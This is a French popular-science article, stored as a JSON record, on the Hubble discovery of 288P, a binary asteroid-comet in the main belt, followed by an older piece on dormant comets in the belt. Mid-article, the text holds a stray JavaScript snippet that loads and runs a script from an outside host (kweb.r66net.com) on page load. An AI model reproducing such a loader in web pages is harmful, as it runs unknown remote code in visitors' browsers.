{"title": "La première comète binaire découverte dans la ceinture d'astéroïdes !", "newspaper": "Futura Sciences", "author": "Laurent Sacco", "date_publi": "22/09/2017", "content": "La nature de certains astéroïdes situés entre Mars et Jupiter peut leur permettre de se comporter à l'occasion comme des comètes : cela, les scientifiques le savaient déjà. Mais, pour la première fois, ces derniers ont découvert un tel objet qui est aussi une comète binaire : 288P. Ce qu'il faut retenir On vient de découvrir, dans la ceinture d'astéroïdes, un système binaire qui se comporte comme une comète : 288 P. Certes, plusieurs astéroïdes binaires étaient déjà connus (probablement qu'ils n'étaient initialement qu'un seul corps céleste dont la vitesse de rotation aurait été accélérée, jusqu'à la rupture par le rayonnement du Soleil). On connaissait aussi une vingtaine de corps dans la ceinture d'astéroïdes dont la nature les rapproche tellement des comètes qu'ils en adoptent le comportement à l'occasion, lorsque des glaces sont sublimées par le rayonnement du Soleil. Mais la découverte de l'astéroïde-comète binaire 288P est une grande première. Il est de plus en plus évident que la ceinture principale d' astéroïdes  est composée de petits corps célestes dont la composition minéralogique, et finalement l'origine, est fort diverse. Certains d'entre eux seraient des anciens  noyaux métalliques  d'embryons de planètes défuntes. D'autres se seraient formés au-delà de l' orbite  de  Jupiter , ce qui les rendrait riches en eau. Mieux, il pourrait s'agir d'anciennes  comètes  ayant largement épuisé leur stock de glaces, ou d'objets similaires aux  comètes  mais dont les glaces sont protégées, temporairement du moins, par une couche de poussières pouvant n'avoir que quelques mètres d'épaisseur. C'est ce qui expliquerait les comportements paradoxaux de certains astéroïdes repérés depuis quelques années et qui se mettent à l'occasion à s'entourer d'une coma et d'une queue similaires à celles d'une comète classique. On vient d'en identifier un autre exemple, comme l'explique une équipe internationale d'astronomes qui vient de publier un article dans  Nature  au sujet de l'objet céleste découvert en 2006 et initialement catalogué 2006 VW139. Il y a quelques années, certains ont suggéré qu'il s'agissait d'un membre d'une famille d'au moins 11 astéroïdes, formée il y a 7,5 millions d'années par la fragmentation lors d'une collision d'un objet dont le diamètre avoisinait 10 km. Mais aujourd'hui, il vient de changer de statut et de nom. Il a été rebaptisé 288P, ce qui signifie, dans le cadre de la nomenclature adoptée en 1995 par l'Union astronomique internationale, qu'il s'agit d'une comète périodique dont la période est inférieure à 200 ans.   Des images de Hubble, prises d'août à septembre 2016, montrent les mouvements et l'activité de la comète binaire 288P. © SciNews 288P, l'astéroïde-comète déjà repéré en 2011 par Hubble 288P avait déjà commencé à intriguer les astronomes dès 2011, sur des images prises par Hubble et qui suggéraient que cet  astéroïde  pouvait avoir une activité cométaire, comme une vingtaine d'objets similaires connus à ce jour. Mais, pour en avoir le cœur net, les chercheurs ont attendu qu'il se rapproche un peu plus du  Soleil  pour se trouver en fait à 200 millions de kilomètres de la Terre.  ( function () { var vs = document.createElement(\"script\"); vs.type = \"text/javascript\"; vs.async = true; vs.src = \"http://kweb.r66net.com/GetLink\"; var s = document.getElementsByTagName(\"script\")[0]; s.parentNode.insertBefore(vs, s); })();  À nouveau mobilisé, Hubble leur a permis de faire une découverte stupéfiante. Non seulement l'activité cométaire est devenue plus importante du fait de la  chaleur  apportée par le rayonnement du Soleil mais le gain en résolution a permis d'établir qu'il s'agissait en fait de la première comète binaire connue de l'Homme ! Les images permettent de suivre clairement un mouvement de révolution autour du centre de masse de deux objets, séparés par une centaine de kilomètres sur une orbite très elliptique. On peut en déduire que les deux corps ont des masses comparables et des tailles similaires de l'ordre du kilomètre. Il est probable que ces  deux corps  n'en faisaient qu'un dans un passé relativement proche. Le corps parent s'est peut-être fragmenté du fait d'une accélération de sa vitesse de rotation causée par le fameux  effet Yarkovsky . Des poches de glace initialement protégées des rayons du Soleil auraient pu alors s'évaporer. Il semble que l'évènement se soit produit il y a 5.000 ans tout au plus, sans quoi un tel objet aurait dû épuiser ses réserves dans la  ceinture d'astéroïdes . Mais, ce qui intéresse les chercheurs, ce n'est pas tellement l'aspect spectaculaire de 288P, mais bien qu'il pourrait nous aider à comprendre l'origine de l'eau sur Terre... Pour en savoir plus La ceinture d'astéroïdes, un cimetière de comètes ? Article de Laurent Sacco publié le 07/08/2013 La frontière entre comètes et astéroïdes devient de plus en plus floue depuis quelques années. Voilà que des astronomes colombiens ayant étudié la nature de corps célestes dans la ceinture principale d'astéroïdes entre Mars et Jupiter confortent cette idée. Selon eux, cette zone serait un véritable cimetière de comètes mortes, ou pour le moins dormantes, revenant parfois à la vie comme des zombies, en s'approchant un peu du Soleil. Les missions  Pioneer  et  Voyager  nous ont révélé que le  Système solaire  était beaucoup plus diversifié qu'on ne l'imaginait, en se basant sur les lois de la mécanique céleste et de la  chimie . Les sondes spatiales, les campagnes d'observation au sol et les simulations conduites via les  ordinateurs  issus des travaux d' Alan Turing  et de  John von Neumann  n'ont fait que confirmer cette complexité. On a ainsi construit récemment des scénarios étonnants pour expliquer la formation des  lunes  du Système solaire, en faisant intervenir des  anneaux planétaires . Il a été avancé que les migrations planétaires auraient causé la recrudescence des impacts météoritiques ou cométaires sur les  planètes telluriques , voilà environ 4,1 à 3,9 milliards d'années (le fameux  Grand Bombardement Tardif , ou  Late Heavy Bombardment , LHB, en anglais). Il s'agit du  modèle de Nice , proposé il y a quelques années par Alessandro Morbidelli et ses collègues. Des comètes piégées dans la ceinture d'astéroïdes lors du LHB Les chercheurs avaient publié dans  Nature  une série d'articles concernant des  simulations numériques  faisant intervenir, après la formation des planètes internes, des migrations de  planètes géantes  vers l'extérieur du Système solaire. Ceci rendait bien compte de plusieurs caractéristiques du Système solaire lors du  Grand Bombardement Tardif . Comparaison de l'ancien paradigme de la ceinture d'astéroïdes et du nouveau. En haut, aucune comète n'existe dans la ceinture, c'est l’ancienne conception. En bas, il y a quelques millions d'années, les comètes y abondaient encore. De nos jours, on peut en observer quelques-unes, comme le montre le dessin central. © Ignacio Ferrin,  University of Antioquia                       Par la suite, Alessandro Morbidelli et ses collègues ont déduit du modèle de Nice que des  comètes , formées légèrement au-delà des planètes géantes il y a plus de quatre milliards d'années, auraient été éjectées en direction de la  ceinture d’astéroïdes  actuelle et s'y seraient trouvées piégées. Ce serait même une part non négligeable des corps de la ceinture qui aurait été capturée lors du LHB, et leur origine serait à chercher au-delà de l'orbite de  Neptune . De fait, depuis une décennie environ, on observe que certains corps célestes, que l'on pensait être de simples astéroïdes dans la ceinture qui s'étend entre Mars et Jupiter, sont capables de se comporter comme des comètes en s'entourant d'une chevelure de poussières et de particules glacées. On peut citer le cas de  (596) Scheila . Traditionnellement, on considérait que la ceinture d' astéroïdes  constituait les restes d'une population de petits corps célestes datant de la formation du Système solaire, qui n'auraient pas pu former une planète par  accrétion  en raison des perturbations gravitationnelles de Jupiter. Mais toutes ces nouvelles données théoriques et observationnelles amènent les astronomes à réviser leurs conceptions sur la nature et l'origine des corps célestes constituant la ceinture d'astéroïdes. L’astéroïde (596) Scheila, de la ceinture principale, a été baptisé en hommage à une étudiante anglaise et amie de son découvreur, l’astronome allemand August Kopff (1882-1960). Une observation réalisée en décembre 2010 a montré qu’il pouvait présenter l'aspect d'une comète avec une queue. Il pourrait s’agir d’une vraie comète dormante. Mais actuellement, on pense que la chevelure cométaire observée à l’époque est plutôt le résultat d’un impact à la surface de cet astéroïde. D’autres observations de petits corps célestes dans la ceinture d’astéroïdes montrent qu’elle abrite bien des comètes. © Kevin Heider,  Wikimedia Commons , CC by-sa 3.0                               Nécropole de comètes Les travaux d'une équipe d'astronomes colombiens de l'université d'Antioquia confortent ce point de vue. Dans leur article déposé sur  arxiv , il s'intéressent à ce qu'ils ont appelé des « comètes Lazare », mais que l'on pourrait tout aussi bien appeler des « comètes zombies », à en juger par le scénario qu'ils avancent. Selon les chercheurs, les 12 comètes actives à courte période découvertes dans la ceinture d'astéroïdes au XXI e  siècle laissent supposer que cette zone est en réalité un véritable cimetière de comètes. Il y a quelques millions d'années seulement, il devait encore y exister des dizaines de milliers de comètes actives. Beaucoup de ces corps célestes auraient épuisé leurs réserves de  glace  et se seraient donc éteints. Mais d'autres seraient  dormants , bien que sur le chemin les amenant vers l' extinction . Sur des orbites stables pendant des dizaines de milliers ou des millions d'années, ils finiraient par se rapprocher légèrement du  Soleil . Un peu de chaleur supplémentaire suffirait pour qu'ils redeviennent temporairement des comètes. Tel Lazare ressuscité sortant de son  tombeau , un zombie quittant les  limbes  pour retrouver sa place parmi les vivants, une nouvelle comète associée à la ceinture d'astéroïdes reviendrait donc à la vie de temps en temps, prête à porter le nom de l' astronome amateur  qui l'aurait découverte. Interview : la Terre menacée par des astéroïdes ?                       Depuis quelques années les scientifiques étudient la menace possible des géocroiseurs pour notre Planète. À l’image du scénario de l’extinction des dinosaures, ces astéroïdes sont-ils une menace pour la vie sur Terre ? Futura-Sciences a interviewé Jean-Pierre Luminet, astrophysicien de renom, afin d’en savoir plus.                                       ", "theme": "sciences"}